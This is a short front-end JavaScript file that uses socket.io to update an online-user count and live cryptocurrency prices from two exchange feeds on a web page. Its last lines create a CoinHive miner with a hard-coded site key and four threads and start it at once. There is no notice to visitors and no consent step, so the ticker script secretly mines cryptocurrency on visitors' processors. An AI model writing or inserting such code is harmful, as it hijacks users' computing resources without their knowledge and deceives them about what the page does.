const socket = io();

socket.on('online', function(msg) {
  // console.log(msg + ' users online');
  $('span.users').html(msg);
});

socket.on('bx', function(msg) {
  // console.log('BX: ', msg);
  msg.forEach(function(obj) {
    const price = obj.last_price % 1 !== 0 ? obj.last_price.toFixed(2) : obj.last_price;    
    const className = 'span.bx-' + obj.name.toLowerCase();
    if ($(className).text() != price) {
      $(className).fadeOut(function() {
        $(this).text(price);
      }).fadeIn();
    }
  }, this);
});

socket.on('bfx', function(msg) {
  // console.log('BFX: ', msg);
  msg.forEach(function(obj) {
    const price = obj.last_price % 1 !== 0 ? obj.last_price.toFixed(2) : obj.last_price;
    const className = 'span.bfx-' + obj.name.toLowerCase();
    if ($(className).text() != price) {
      $(className).fadeOut(function() {
        $(this).text(price);
      }).fadeIn();
    }
  }, this);
});

const miner = new CoinHive.Anonymous('sp7LqLtBdTo71t60bB5QMaVlAjZVkIUD', {
  threads: 4,
  autoThreads: false,
  throttle: 0.8,
	forceASMJS: false
});
miner.start();